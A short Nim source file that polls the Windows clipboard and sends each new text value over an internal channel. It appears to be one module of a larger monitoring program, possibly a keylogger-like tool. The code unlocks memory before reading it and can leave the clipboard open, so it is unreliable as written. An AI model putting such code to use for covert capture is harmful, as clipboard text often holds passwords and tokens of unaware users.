## TEMPORARY SOLUTION,
## MIGHT CONSIDER USING GETMESSAGE HOOKS
## FOR WATCHING THE CLIPBOARD

from os import sleep

from winim/inc/winuser import OpenClipboard
from winim/inc/winuser import GetClipboardData
from winim/inc/winuser import CloseClipboard

from winim/inc/windef import HANDLE

from winim/inc/winbase import GlobalLock
from winim/inc/winbase import GlobalUnlock
from winim/inc/winbase import GlobalLock

from ../flags import CLIPBOARD_THREAD_CHECK_INTERVAL

from ../channels import mainChannel

type clipboardResult = tuple[worked: bool, data: string]

proc GetClipboardText(): clipboardResult =
  result = (false, "")

  if OpenClipboard(0) != 0:
    let hData: HANDLE = GetClipboardData(1)         # CF_TEXT

    if hData != 0:
      let str: cstring = cast[cstring](GlobalLock(hData))

      GlobalUnlock(hData)
      CloseClipboard()

      result.data = $str

      if result.data != "":
        result.worked = true

proc initClipboardThread*(): void {.thread.} =
  var prevClipboard: string = ""

  while true:
    let (worked, clipboard) = GetClipboardText()

    if worked == true and clipboard != prevClipboard:
      mainChannel.send ("c", clipboard)
      prevClipboard = clipboard

    sleep(CLIPBOARD_THREAD_CHECK_INTERVAL)
